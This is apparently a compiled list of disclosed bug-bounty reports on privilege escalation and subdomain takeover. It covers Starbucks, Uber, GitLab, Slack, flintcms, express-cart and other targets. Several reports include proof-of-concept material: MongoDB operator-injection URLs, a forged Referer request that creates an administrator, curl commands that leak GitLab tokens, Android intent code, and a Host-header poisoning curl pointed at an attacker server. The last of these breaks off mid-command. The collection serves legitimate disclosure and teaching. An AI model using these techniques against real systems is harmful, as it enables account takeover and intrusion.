Azure-check-availability.png -> Screenshot of the Azure website api "check availability" for the "eastus" cloudapp virtual machine. on the link, you can see the location "eastus" part of the fqdn ad the DomainNameLabel "feuscspma3fcvapi" part of the FQDN, and the "available : true" response for this fqdn.
dns-proof.png -> Result of a "dig" command for this domains, showing the "NXDOMAIN" reponse for the CNAME entry of the ford subdomain.

Cheers,

March_42

## Impact

Subdomain takeover can be abused to do several things like :

Malware distribution
Phishing / Spear phishing
XSS
Authentication bypass
Legitimate mail sending and receiving on behalf of ford subdomain
...
List goes on and on.

---

### [Privilege Escalation: Read-Only to Admin](https://hackerone.com/reports/277138)

- **Report ID:** `277138`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Inflection
- **Reporter:** @foobar7
- **Bounty:** - usd
- **Disclosed:** 2019-03-15T17:10:52.769Z
- **CVE(s):** -

**Summary (team):**

While the interface hides the users page from read-only users, they can still perform PUT requests to the API to change their privileges where they only have read-only permissions.

---

### [Subdomain takeover at signup.uber.com](https://hackerone.com/reports/197489)

- **Report ID:** `197489`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Uber
- **Reporter:** @ak1t4
- **Bounty:** - usd
- **Disclosed:** 2019-01-25T17:50:37.948Z
- **CVE(s):** -

**Summary (team):**

The domain `signup.uber.com` was pointing to an unclaimed Netlify domain, allowing an attacker to take over the subdomain. We remediated this issue by deleting the CNAME record from our DNS.

Thanks, @ak1t4!

**Summary (researcher):**

Another great TKO - thanks UBER!

---

### [UniFi Video Server - Broken access control on system configuration](https://hackerone.com/reports/129698)

- **Report ID:** `129698`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Ubiquiti Inc.
- **Reporter:** @hamlon
- **Bounty:** - usd
- **Disclosed:** 2018-11-07T11:54:00.309Z
- **CVE(s):** -

**Summary (team):**

In UniFi Video Server prior to 3.7.0, an attacker with user permissions can download the Backup and Support files.

---

### [Domain Takeover in [obviousengine.com] a snapchat acquisitions](https://hackerone.com/reports/392785)

- **Report ID:** `392785`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Snapchat
- **Reporter:** @malcolmx
- **Bounty:** - usd
- **Disclosed:** 2018-10-07T09:46:55.716Z
- **CVE(s):** -

**Vulnerability Information:**

Hello,

##Summary
while searching in snapchat acquisitions i found  ` obviousengine ` moe information here https://www.crunchbase.com/organization/obvious-engineering#section-overview
and i found that it's pointing to Github page so i claimed it 

##POC
- when i visit it was look like 

{F331040}

- i successfully takeover it 

{F331041}

## Impact

Domain takeover is abused for several purposes:

* Malware distribution
* Phishing / Spear phishing
* XSS
* Authentication bypass
* ...

Thanks

---

### [[flintcms] Account takeover due to blind MongoDB injection in password reset](https://hackerone.com/reports/386807)

- **Report ID:** `386807`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** Node.js third-party modules
- **Reporter:** @becojo
- **Bounty:** - usd
- **Disclosed:** 2018-08-15T14:17:31.426Z
- **CVE(s):** CVE-2018-3783

**Vulnerability Information:**

I would like to report a privilege escalation vulnerability in flintcms.
It allows to reset a known user password, extract its password reset token and reset its password to then access the account.

# Module

**module name:** flintcms
**version:** v.1.1.9
**npm page:** `https://www.npmjs.com/package/flintcms`

## Module Description

Flint is a CMS built to be easy to use and super flexible. Your content needs to fit into more layouts and environments than anyone but you can plan for, so Flint enables you to make the templates you need and fill it with your content. It's a CMS that is built for those who want to fully design the front-end of their website without wanting to deal with static site generators or older content management systems (that are slow and use outdated technology).

## Module Stats

7 downloads in the last week

# Vulnerability

## Vulnerability Description

The vulnerability is caused by the lack of user input sanitization in the route that verifies the password reset token. The value from the parameter is directly sent to the Mongoose API which allows a user to insert MongoDB query operators. These operators can be used to extract the value of the field _blindly_ in the same manner of a blind SQL injection. In this case, the `$regex` operator is used to guess each character of the token from the start.

Vulnerable code:

```js
  router.get('/verify', async (req, res) => {
    const token = req.query.t

    const user = await User.findOne({ token })

    if (!user) {
      res.redirect('/admin')
      return
    }

    res.redirect(`/admin/sp/${token}`)
  })
```
You can tell the different behavior when visiting these pages (assuming one of the user has reset their password):
- http://localhost:4000/admin/verify?t[$ne]=something redirects to http://localhost:4000/admin/sp/[object%20Object]
- While http://localhost:4000/admin/verify?t[$eq]=something redirects to http://localhost:4000/admin/login?p=/admin/

To take over an account, the following are required:
1. Reset the password of the targeted account (the email of the target user must be know)
2. Use the password reset page to extract the token using the blind MongoDB injection
3. Use the token to reset the password and log in 

---

To lift the requirements to know the email, it is also possible to find the emails of the users because the password reset form is also vulnerable to blind MongoDB injection. In the same manner as previously, each character of the email can be guessed using the `$regex` MongoDB operator.

Vulnerable code:
```js
  router.post('/forgotpassword', async (req, res) => {
    const { email } = req.body
    const user = await User.findOne({ email })

    if (!user) {
      res.status(400).end('There is no user with that email.')
      return
    }
    // [...]
```

## Steps To Reproduce:

1. Follow the install guide https://flintcms.co/docs/installation/
2. Create the admin user at http://localhost:4000/admin/install
3. Log out
4. Proceed to reset the password of the admin. Let's say the email configured was `admin@localhost.com`
5. Run the provided Python script
6. Visit the reset URL that the script finds
7. Reset the user password
8. You are now logged in

## Patch
The request parameters should be converted to string before being sent to the Mongoose API. Adding `.toString()` to the parameters should be enough to prevent objects being passed to Mongoose. For example:

```js
    const { email } = req.body
    const user = await User.findOne({ email: email.toString() })
```

```js
    const token = req.query.t.toString()
```

Further sanitization should be added to other endpoints. 

## Supporting Material/References:

- Ubuntu 16.04.3 LTS
- v8.4.0
- 5.3.0
- For the script: Python 2.7.12 and the `requests` package

# Wrap up
- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

An attacker could take over the website, delete data or server malicious content.

---

### [Subdomain takeover on wfmnarptpc.starbucks.com](https://hackerone.com/reports/388622)

- **Report ID:** `388622`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Starbucks
- **Reporter:** @0xpatrik
- **Bounty:** - usd
- **Disclosed:** 2018-08-09T21:09:10.902Z
- **CVE(s):** -

**Vulnerability Information:**

Hello,

this is pretty serious security issue in some context, so please act as fast as possible.

Overview:
One of the starbucks.com subdomains is pointing to Azure, which has unclaimed CNAME record. ANYONE is able to own starbucks.com subdomain at the moment.

This vulnerability is called subdomain takeover. You can read more about it here:

https://0xpatrik.com/subdomain-takeover-basics/

Details:
wfmnarptpc.starbucks.com has CNAME to s00149tmppcrpt.trafficmanager.net. However, s00149tmppcrpt.trafficmanager.net is not registered in Azure cloud anymore and thus can be registered by anyone. After registering the TrafficManager Profile in Azure portal, the person doing so has full control over content on wfmnarptpc.starbucks.com.

PoC:
http://wfmnarptpc.starbucks.com/poc.html

 Mitigation:
Remove the CNAME record from starbucks.com DNS zone completely.
Claim it back in Azure portal after I release it
Regards,

Patrik Hudak

## Impact

Subdomain takeover is abused for several purposes:

Malware distribution
Phishing / Spear phishing
XSS
Authentication bypass
...
List goes on and on. Since some certificate authorities (Let's Encrypt) require only domain verification, SSL certificate can be easily generated.

**Summary (researcher):**

Subdomain takeover possible on one of Starbucks's subdomain. The subdomain pointed to Microsoft Azure Traffic Manager which was no longer registered under Azure.

Detailed write-up: https://0xpatrik.com/subdomain-takeover-starbucks-ii/

---

### [Subdomain takeover on svcgatewaydevus.starbucks.com and svcgatewayloadus.starbucks.com](https://hackerone.com/reports/383564)

- **Report ID:** `383564`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** Starbucks
- **Reporter:** @blurbdust
- **Bounty:** - usd
- **Disclosed:** 2018-07-23T17:45:05.475Z
- **CVE(s):** -

**Vulnerability Information:**

Hello,

This is fairly close to [this report](https://hackerone.com/reports/325336) however these are different subdomains than the one in the report.

This can be pretty serious since I can server virtually anything I want. In the 45 minutes I've held the domain I have served to 341 unique IP addresses. 

Two starbucks.com subdomains are pointed to Azure with an unclaimed CNAME record. Anyone would be able to serve content on these subdomains.

##svcgatewayloadus.starbucks.com
```
;; Server: 1.1.1.1:53
;; Size: 191
;; Unix time: 1531965036
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 3697
;; flags: qr rd ra ; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 0

;; QUESTION SECTION:
svcgatewayloadus.starbucks.com. IN A

;; ANSWER SECTION:
svcgatewayloadus.starbucks.com. 600 IN CNAME s00197tmp0crdfulload0.trafficmanager.net.

;; AUTHORITY SECTION:
trafficmanager.net. 30 IN SOA tm1.msft.net. hostmaster.trafficmanager.net. 2003080800 900 300 2419200 30

```

##svcgatewaydevus.starbucks.com
```
;; Server: 9.9.9.9:53
;; Size: 156
;; Unix time: 1531965036
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 47788
;; flags: qr rd ra ; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 0

;; QUESTION SECTION:
svcgatewaydevus.starbucks.com. IN A                                                                                                                                                            

;; ANSWER SECTION:
svcgatewaydevus.starbucks.com. 600 IN CNAME s00197tmp0crdfuldev0.trafficmanager.net.                                                                                                           

;; AUTHORITY SECTION:
trafficmanager.net. 30 IN SOA tm1.msft.net. hostmaster.trafficmanager.net. 2003080800 900 300 2419200 30
```

#PoC:
http://svcgatewayloadus.starbucks.com/
http://svcgatewaydevus.starbucks.com/

##Mitigation:
Remove the CNAME record from the starbucks.com DNS zone
Claim it in Azure once I release it

## Impact

Subdomain takeover can be used for several purposes:

* Malware
* Phishing / Spear phishing
* XSS
* Authentication bypass

---

### [Privilege escalation allows any user to add an administrator](https://hackerone.com/reports/343626)

- **Report ID:** `343626`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** Node.js third-party modules
- **Reporter:** @patrickrbc
- **Bounty:** - usd
- **Disclosed:** 2018-07-12T07:57:47.724Z
- **CVE(s):** CVE-2018-16483

**Vulnerability Information:**

I would like to report privilege escalation in the npm module express-cart.

It allows a normal user to add another user with administrator privileges.

# Module

**module name:** express-cart
**version:** 1.1.5
**npm page:** `https://www.npmjs.com/package/express-cart`

## Module Description

expressCart is a fully functional shopping cart built in Node.js (Express, MongoDB) with Stripe, PayPal and Authorize.net payments.

## Module Stats

[10] weekly downloads

# Vulnerability

## Vulnerability Description

A deficiency in the access control allows normal users from expressCart to add new users to the application. This behavior by itself might be considered a privilege escalation. However, it was also possible to add the user as administrator.

## Steps To Reproduce:

Firstly, I noticed that all the endpoints located in the *user.js* file are not being restricted by the *common.restrict* middleware, as the other admin routes do.  Also, the endpoint */admin/user/insert* does not check if the user is admin before adding a new user, which I guess it would be a unlikely behavior.

The following code is used to check if it is the first time creating a user:

```
// set the account to admin if using the setup form. Eg: First user account
let urlParts = url.parse(req.header('Referer'));

let isAdmin = false;
if(urlParts.path === '/admin/setup'){
  isAdmin = true;
}
```

As you can see in the above snippet, if you send a request with a Referer containing the string */admin/setup* the user added will be considered an admin. For example:

```
POST /admin/user/insert HTTP/1.1
Host: localhost:1111
Referer: http://localhost:1111/admin/setup
Content-Type: application/x-www-form-urlencoded
Cookie: connect.sid=[NORMAL_USER_COOKIE]

usersName=NEWADMIN&userEmail=new@admin.com&userPassword=password&frm_userPassword_confirm=password
```

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

This vulnerability would allow any registered user to create another user with administrator privileges and takeover the application.

---

### [Privilage escalation with malicious .npmrc](https://hackerone.com/reports/358359)

- **Report ID:** `358359`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Node.js third-party modules
- **Reporter:** @ginden
- **Bounty:** - usd
- **Disclosed:** 2018-06-30T14:34:57.891Z
- **CVE(s):** -

**Vulnerability Information:**

Hello.

I'm forwarding to you my conversation with npm staff regarding security issue. It allows to escalate to root privilages of victim using either:

a) basic social engineering - convincing victim to run npm in attacker-controlled folder (eg. repository), including such innocent ones like "npm help" or "npm whoami"  
b) low-privilage process with access to writing files  

I believe that impact of this bug can be high, if someone is able to hijack well-positioned tutorial.

Michał Wadas  

  

---------- Forwarded message ----------  


**Jon Lamendola** (npm)

May 22, 12:19 PDT

Hello Michal,

We're reviewing the impact of changing this behavior and still discussing internally how we might move forward. We understand that it's a risk, but it is also a feature that people use, so we need to fully understand the consequences of making major changes to it before we do. Unfortunately, this can take some time to analyze.

In the meantime, you can alias npm to something like npm --onload-script="" "$@" for a temporary workaround.

Thanks again for reporting this to us.

**Michał Wadas**

May 21, 07:05 PDT

Hi.

Is there any update on this?

**Michał Wadas**

Apr 26, 16:32 PDT

Just noticed - if attacker can control .npmrc (either by writing it from low-privilage script or tricking user into using sudo npm in infected folder), he can set user flag in .npmrc too.

**Jon Lamendola** (npm)

Apr 26, 11:36 PDT

Hello Michal,

Thanks for reporting this to us. I agree, this is a legitimate concern, and I will pass this on to the npm CLI team for discussion.

**Michał Wadas**

Apr 26, 09:54 PDT

Source of issue:

* onload-script is run with privilages of user running npm, in npm process.  
* User can be unaware of .npmrc behaviour

I have pin-pointed it to line 236 in lib/npm.js file in master tree.
Attack scenario:

* Attacker tricks victim into running "sudo npm" in folder (or descendant of folder) with malicious .npmrc
** This can be achieved in many ways - eg. by writing to $HOME/.npmrc from low-privilaged application or tricking victim to open infected directory  
** Example: tutorial asks user to clone git repository, configure it and then run "sudo npm i -g eslint"  
** Example 2: attacker publish malicious code to npm. Code writes to $HOME/.npmrc. Then, attacker can just wait for anyone running sudo npm.
* Then npm runs arbitrary Node.js script with arbitrary permissions

Proposed actions:

* Ignore onload-script when run as super user  
* Ask for confirmation before running onload-script  
* Run onload-script in separate process with lower privilages (it's already supported for other scripts in npm - [https://docs.npmjs.com/misc/<wbr>scripts#user</wbr>](https://docs.npmjs.com/misc/scripts#user) )

These actions should limit scope of attack.

Quick survey in group of Polish programmer showed that around ~30% of npm users use sudo npm

All versions of npm between 3.10 and 6.0 are confirmed to be vulnerable.

Thanks for your attention,  
Michał Wadas

## Impact

Attacker can reliably run arbitrary code with user privilages if he is able to write to .npmrc.

If user use "sudo npm" in folder with malicious .npmrc, attacker can run arbitrary code with root privilages.

---

### [Subdomain takeover on svcgatewayus.starbucks.com](https://hackerone.com/reports/325336)

- **Report ID:** `325336`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** Starbucks
- **Reporter:** @0xpatrik
- **Bounty:** - usd
- **Disclosed:** 2018-06-25T18:59:58.915Z
- **CVE(s):** -

**Vulnerability Information:**

Hello,

this is pretty serious security issue in some context, so please act as fast as possible.

### Overview:

One of the starbucks.com subdomains is pointing to Azure, which has unclaimed CNAME record. ANYONE is able to own starbucks.com subdomain at the moment.

This vulnerability is called subdomain takeover. You can read more about it here:

* https://blog.sweepatic.com/subdomain-takeover-principles/
* https://hackerone.com/reports/32825
* https://hackerone.com/reports/175070
* https://hackerone.com/reports/172137

### Details:

svcgatewayus.starbucks.com has CNAME to s00197tmp0crdfulprod0.trafficmanager.net which has CNAME to 1fd05821-7501-40de-9e44-17235e7ab48b.cloudapp.net. However, 1fd05821-7501-40de-9e44-17235e7ab48b.cloudapp.net is not registered in Azure cloud anymore and thus can be registered by anyone. After registering the Cloud App in Azure portal, the person doing so has full control over content on svcgatewayus.starbucks.com.

### PoC:

http://svcgatewayus.starbucks.com

### Mitigation:

* Remove the CNAME record from starbucks.com DNS zone completely.
* Claim it back in Azure portal after I release it

Regards,

Patrik Hudak

## Impact

Subdomain takeover is abused for several purposes:

* Malware distribution
* Phishing / Spear phishing
* XSS
* Authentication bypass
* ...

List goes on and on. Since some certificate authorities (Let's Encrypt) require only domain verification, SSL certificate can be easily generated.

**Summary (researcher):**

Subdomain takeover possible on one of Starbucks's subdomain. The subdomain pointed to Microsoft Azure Cloud App which was no longer registered under Azure.

Detailed write-up: https://0xpatrik.com/subdomain-takeover-starbucks/

---

### [ACME TLS-SNI-01/02 challenge vulnerable when combined with shared hosting providers](https://hackerone.com/reports/304378)

- **Report ID:** `304378`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** Internet Bug Bounty
- **Reporter:** @fransrosen
- **Bounty:** - usd
- **Disclosed:** 2018-05-19T19:22:01.149Z
- **CVE(s):** -

**Vulnerability Information:**

The [ACME TLS-SNI-01](https://tools.ietf.org/html/draft-ietf-acme-acme-01#section-7.3) (and [TLS-SNI-02](https://tools.ietf.org/html/draft-ietf-acme-acme-09#section-8.4)) specification assumed wrong in terms of how current major cloud providers routed and validated domains. This was reported earlier this week to Let's Encrypt, and they decided to disable the method. Today Let's Encrypt decided to sunset both TLS-SNI-01 and TLS-SNI-02 due to the vulnerability I found. 

A full writeup of the finding and my side of the timeline can be found here:

* [How I exploited ACME TLS-SNI-01 issuing Let's Encrypt SSL-certs for any domain using shared hosting](https://labs.detectify.com/2018/01/12/how-i-exploited-acme-tls-sni-01-issuing-lets-encrypt-ssl-certs-for-any-domain-using-shared-hosting/)

Here is Let's Encrypt first and second announcement about the reported issue:

* [2018.01.09 Issue with TLS-SNI-01 and Shared Hosting Infrastructure](https://community.letsencrypt.org/t/2018-01-09-issue-with-tls-sni-01-and-shared-hosting-infrastructure/49996)
* [2018.01.11 Update Regarding ACME TLS-SNI and Shared Hosting Infrastructure](https://community.letsencrypt.org/t/2018-01-11-update-regarding-acme-tls-sni-and-shared-hosting-infrastructure/50188)

Regards,
Frans

## Impact

The ability to issue SSL-certificates for domains not under the attacker's control but served using the same shared hosting provider.

---

### [UniFi Video v3.2.2 (Windows) Local Privileges Escalation due to weak default install directory ACLs](https://hackerone.com/reports/140793)

- **Report ID:** `140793`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Ubiquiti Inc.
- **Reporter:** @mrtuxracer
- **Bounty:** - usd
- **Disclosed:** 2017-12-20T12:12:54.441Z
- **CVE(s):** CVE-2016-6914

**Summary (team):**

The UniFi Video Windows installation `v3.7.3` and prior create directories with insecure permission, allowing unprivileged users to modify UniFi Video files and consequently escalate privileges.

**Summary (researcher):**

This vulnerability does affect all UniFi video versions up to and including 3.7.3 and is referenced by **CVE-2016-6914**. 

The full public advisory can be found here: http://seclists.org/fulldisclosure/2017/Dec/83.

---

### [Multiple Subdomain takeovers via unclaimed instances](https://hackerone.com/reports/276269)

- **Report ID:** `276269`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Starbucks
- **Reporter:** @benoculars
- **Bounty:** - usd
- **Disclosed:** 2017-12-04T22:44:46.643Z
- **CVE(s):** -

**Summary (team):**

Hacker @benoculars was able to successfully faciliate multiple subdomain takeovers by taking advantage of a process flow to use some of the space provided for germany.openapi.starbucks.com, psv.openapi.starbucks.com, stage-psv.openapi.starbucks.com, and test-psv.openapi.starbucks.com. While we were still securely serving content from these domains, and no users or operations were impacted, it would have been possible for @benoculars to serve content from unique URLs not in use by our applications and services. 

@benoculars had illustrated a non-destructive PoC, showing his ability to serve content from our domain. We were able to make platform and operational changes to resolve this issue. 

Thanks @benocular for identifying weak subdomains and helping to resolve this issue! Great work!

---

### [Subdomain Takeover](https://hackerone.com/reports/289051)

- **Report ID:** `289051`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** GSA Bounty
- **Reporter:** @nevertoolate
- **Bounty:** - usd
- **Disclosed:** 2017-11-28T22:03:29.625Z
- **CVE(s):** -

**Summary (team):**

@picklepwns discovered a subdomain takeover attack.

Technically, the domain was out of scope for our Vulnerability Disclosure Policy. We want to remind hackers to please limit their testing to domains explicitly listed in that scope (which is repeated on our HackerOne program page for convenience). This is for your own safety: we want to be sure that everyone's on the same page about your activities being authorized.

That said, this was a legitimate vulnerability, which we fixed with other government partners.

Thanks for the find, @picklepwns - we really appreciate it!

**Summary (researcher):**

While looking for bugs in a TTS target, I stumbled on a host that seemed (loosely) related to my target that was vulnerable to a subdomain takeover via an unused Amazon S3 bucket. I ended up taking over the subdomain and reporting it to the TTS Bug Bounty team who resolved the issue.

The bug was not in scope for the [18F Vulnerability Disclosure Policy](https://github.com/18F/vulnerability-disclosure-policy/blob/master/vulnerability-disclosure-policy.md) and (rightly so) not eligible for a bounty, however the team was quick, responsive, courteous and professional throughout and I highly recommend this program.

---

### [Privilege Escalation using API->Feature](https://hackerone.com/reports/239719)

- **Report ID:** `239719`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** Ubiquiti Inc.
- **Reporter:** @hacknroll
- **Bounty:** - usd
- **Disclosed:** 2017-11-24T11:28:34.129Z
- **CVE(s):** CVE-2017-0932

**Summary (team):**

EdgeOS version `1.9.1.1` and prior, consequence of the lack of validation on the input of the `Feature` functionality, an attacker with access to an `operator` (read-only) account and ssh connection to the devices, can escalate privileges to `admin` (root) access in the system.

**Summary (researcher):**

The **EdgeRouter X** (firmware `v1.9.1.1`) is susceptible to a local **privilege escalation** due a **Path Traversal** vulnerability in the `Feature` API. This vulnerability allows an attacker with non-privileged access (read-only) to execute commands on the device with the root rights. The attack consists in sending a maliciously crafted file (using `scp` with a non-privileged account) to the device and then calling the vulnerable API exploiting the Path Traversal. The exploitation will result on the crafted file being executed with root permission, giving the attacker full access to the device.

---

### [Privilege escalation in the client impersonation functionality](https://hackerone.com/reports/221454)

- **Report ID:** `221454`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Ubiquiti Inc.
- **Reporter:** @twicedi
- **Bounty:** - usd
- **Disclosed:** 2017-11-13T10:41:48.510Z
- **CVE(s):** -

**Summary (team):**

In UCRM `2.3.0-beta4` and prior, consequence of a lack of validation in `Client Impersonation` functionality, an attacker with access to an `Read-Only` account can escalate privileges to `Admin`. The vulnerability was fixed in UCRM `2.3.0`.

---

### [Subdomain Takeover via unclaimed UserVoice domain](https://hackerone.com/reports/269109)

- **Report ID:** `269109`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Snapchat
- **Reporter:** @benoculars
- **Bounty:** 250 usd
- **Disclosed:** 2017-10-04T11:25:04.879Z
- **CVE(s):** -

**Summary (team):**

@benocular found a bitstripsforschools CNAME entry pointing to an unclaimed UserVoice domain, which could be taken over by an external party.

The CNAME entry was for a product that is no longer active.

---

### [all private tokens are leaked to an unauthenticated attacker](https://hackerone.com/reports/268794)

- **Report ID:** `268794`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** GitLab
- **Reporter:** @rpearl
- **Bounty:** - usd
- **Disclosed:** 2017-09-21T13:55:55.437Z
- **CVE(s):** -

**Vulnerability Information:**

Using the api, one can obtain the authentication token for any user on gitlab:
```
$ curl -s --request GET https://gitlab.com/api/v4/users/951422 | jq '.authentication_token'
"[redacted]"
```

We can then use this token to impersonate any user to perform any action they can perform:
```$ curl --request POST --header "PRIVATE-TOKEN: [redacted]" https://gitlab.com/api/v4/projects/3831210/issues?title=owned```

```
{"id":6843690,"iid":4,"project_id":3831210,"title":"owned","description":"","state":"opened","created_at":"2017-09-15T21:58:06.342Z","updated_at":"2017-09-15T21:58:06.342Z","labels":[],"milestone":null,"assignees":[],"author":{"id":951422,"name":"Andrew Drake","username":"adrake","state":"active","avatar_url":"https://secure.gravatar.com/avatar/5cd00179addefbca6d635845534a1ee6?s=80&d=identicon","web_url":"https://gitlab.com/adrake"},"assignee":null,"user_notes_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"weight":null,"web_url":"https://gitlab.com/karmiclabs/slabricator/issues/4","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"_links":{"self":"http://gitlab.com/api/v4/projects/3831210/issues/4","notes":"http://gitlab.com/api/v4/projects/3831210/issues/4/notes","award_emoji":"http://gitlab.com/api/v4/projects/3831210/issues/4/award_emoji","project":"http://gitlab.com/api/v4/projects/3831210"},"subscribed":true}
```

---

### [Subdomain take-over of {REDACTED}.18f.gov](https://hackerone.com/reports/263542)

- **Report ID:** `263542`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** GSA Bounty
- **Reporter:** @jackds
- **Bounty:** - usd
- **Disclosed:** 2017-09-06T14:46:33.376Z
- **CVE(s):** -

**Summary (team):**

@jackds discovered a number of related subdomain takeover attacks against some subdomains of 18f.gov. 
 
Technically, these domains are out of scope for our [Vulnerability Disclosure Policy](https://github.com/18F/vulnerability-disclosure-policy/blob/master/vulnerability-disclosure-policy.md). We want to remind hackers to please limit their testing to domains explicitly listed in that scope (which is repeated on [our HackerOne program page](https://hackerone.com/tts) for convenience). This is for your own safety: we want to be sure that everyone's on the same page about your activities being authorized.

That said, this was a legitimate vulnerability, which we fixed, and we're disclosing details because they may be useful to other folks who operate services like ours.

We couldn't just remove the DNS entries, since those are used for internal purposes with agency CNAMEs. However, there were other ways we were able to resolve this by routing requests for unknown domains differently, and now serve 404s for these subdomains.

A few more details about the cause and solutions:

* For the subdomain in question, this was caused by a combination of how were routing requests to unknown domains and how we served static websites.
* The basic issue was that our servers used our `{REDACTED}.18f.gov` domain as a fallback for any unknown domain requests routed to us. So if a request came in for particular subdomains, we would end up treating it sort of like a request to `https://{REDACTED}.18f.gov`. Since we proxied our home page requests to the same host where `{REDACTED}.18f.gov`'s static site is currently hosted, and we passed along the original HTTP Host header for these unknown domains, it meant that the host would respond as if that unknown domain had been accessed directly on that host. As demonstrated, users could then to serve up content on these other domains.
* So all that being said, the fix was actually straightforward, since it just involved disabling using the `{REDACTED}.18f.gov` website as a fallback for unknown domains. This should mean that the only requests we forward now are actually ones for the `{REDACTED}.18f.gov` domain.

Thanks for the find, @jackds - we really appreciate it!

[See also #263902, which was an independent discovery of the same issue on a different subdomain.]

---

### [Access of Android protected components via embedded intent](https://hackerone.com/reports/200427)

- **Report ID:** `200427`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** Slack
- **Reporter:** @bagipro
- **Bounty:** - usd
- **Disclosed:** 2017-07-17T23:34:56.039Z
- **CVE(s):** -

**Summary (team):**

@bagipro found a vulnerability wherein a malicious and unprivileged app on the victim's phone could interact with any activity in the Slack Android app, allowing manipulation of the app in unintended ways. Thanks for the finding @bagipro!

**Summary (researcher):**

I found the following code inside ```com.Slack.ui.HomeActivity``` (exported activity, it means that any third-party app installed on the device/instant app can access it)
```java
protected void onResume() {
    // ...
    handleIntentExtras(getIntent()); // attacker can pass anything to getIntent()
}

private void handleIntentExtras(Intent intent) {
    // ...
    Intent deeplinkIntent = (Intent) intent.getParcelableExtra("extra_deep_link_intent");
    //  ...
    if (!(deeplinkIntent == null || this.consumedDeeplinkIntent)) {
        // ...
        startActivity(deeplinkIntent); // danger! starting an intent provided by an attacker
        // ...
    }
    // ...
}
```
So we get that ANY protected/not exported activity can be reached.
Here is an example how it can be used against ```com.Slack.ui.WebViewActivity```, ***opening arbitrary link inside WebView***
```java
Intent next = new Intent();
next.setClassName("com.Slack", "com.Slack.ui.WebViewActivity");
next.putExtra("extra_url", "http://example.com/");
next.putExtra("extra_title", "test");

Intent start = new Intent();
start.setClassName("com.Slack", "com.Slack.ui.HomeActivity");
start.putExtra("extra_deep_link_intent", next);

startActivity(start);
```

It could be used with ```javascript:``` scheme to trigger XSS, or perform fishing attacks (because users don't see the real URL, only the title provided by the attacker)

Result:
{F154295}

***Making calls to real people***
```java
Intent next = new Intent("create");
next.setClassName("com.Slack", "com.Slack.ui.CallActivity");
next.putExtra("EXTRA_CALL_NAME", "Fake call name");
next.putExtra("EXTRA_CALLER_ID", "U1RFBBPCP");
next.putExtra("EXTRA_CHANNEL_NAME", "Fake channel name");
next.putExtra("EXTRA_CHANNEL_ID", "D2B84FUFQ");
next.putExtra("EXTRA_USERS_TO_INVITE", new ArrayList<String>(Arrays.asList(new String[] { "U2B81JBAL" })));

Intent start = new Intent();
start.setClassName("com.Slack", "com.Slack.ui.HomeActivity");
start.putExtra("extra_deep_link_intent", next);

startActivity(start);
```
Result:
{F157904}

Was able to perform other actions too like show fake comments and content, spoof received files (with social engineering could be used to force users to download any files provided by the attacker)

---

### [Privilege escalation-User who does not have access is able to add notes to the contact](https://hackerone.com/reports/235059)

- **Report ID:** `235059`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Mixmax
- **Reporter:** @syntax-error
- **Bounty:** - usd
- **Disclosed:** 2017-06-16T21:49:44.310Z
- **CVE(s):** -

**Summary (team):**

We didn't properly check that users had read-write access to contacts when posting notes.

**Summary (researcher):**

.

---

### [Password Reset link hijacking via Host Header Poisoning ](https://hackerone.com/reports/226659)

- **Report ID:** `226659`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Concrete CMS
- **Reporter:** @cdl
- **Bounty:** - usd
- **Disclosed:** 2017-06-06T01:37:41.675Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary
Concrete5 uses the `Host` header when sending out password reset links. This allows an attacker to insert a malicious host header, leading to password reset link / token leakage.

## Impact
The victim will receive the malicious link in their email, and, when clicked, will leak the user's password reset link / token to the attacker, leading to full account takeover.

## Reproduction
1.) Open up Firefox and Burp Suite.)
2.) Visit the forgot password page `(/index.php/login/concrete/forgot_password)`
3.) Enter the victim's email address and click `Reset and Email Password`
4.) Intercept the HTTP request in Burp Suite & change the `Host` Header to your malicious site / server.

Example:
{F182477}

5.) Forward the request and you'll be redirected to your server.

The victim will then receive a password reset e-mail with your poisoned link.
{F182478}

If the victim clicks the link, the reset token will be leaked and the attacker will be able to find the reset token in the server logs. The attacker can then browse to the reset page with the token and change the password of the victim account!


This can also be reproduced using the **curl** command
```
curl -i -s -k  -X $'POST' \
   -H 'Host:sxcurity.pro' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Referer: http://<TARGET>/index.php/login/callback/concrete/forgot_password' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'<COOKIES>' \
